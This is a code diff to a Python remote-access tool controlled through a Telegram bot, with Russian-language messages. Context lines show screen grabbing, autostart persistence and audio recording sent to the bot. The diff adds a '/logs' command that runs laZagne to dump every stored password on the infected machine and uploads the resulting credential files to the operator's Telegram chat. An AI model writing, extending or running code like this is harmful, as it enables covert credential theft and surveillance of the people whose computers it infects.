@@ -21,7 +21,7 @@ from PIL import Image, ImageGrab
 
 USER_NAME = getpass.getuser()
 
-mytoken = ''
+mytoken = 'Telegram bot token'
 
 bot = telebot.TeleBot(mytoken)
 
@@ -208,6 +208,21 @@ def commands(message):
                 except:
                         bot.send_message(message.chat.id, 'ошибка,не добавил в автозагрузку|PS(МБ не сменил имя файла оно стандартно Название)')
 
+
+        elif message.text == '/logs':
+                os.system('laZagne.exe all -oN')
+                time.sleep(5)
+                files = os.listdir()
+                for file in files:
+                        if 'credentials' in file:
+                                password_file = open(file)
+                                bot.send_document(message.chat.id,password_file)
+                                password_file.close()
+                        
+
+                
+
+
 def get_record(message):
         global record
         record = message.text
@@ -253,8 +268,6 @@ def get_record(message):
                         audio = open('audio.wav', 'rb')
 
                         bot.send_audio(message.chat.id, audio)
-
-
                 else:
                         bot.send_message(message.chat.id,'сказано не больше 60sec!',reply_markup=mainkeyboard)
 
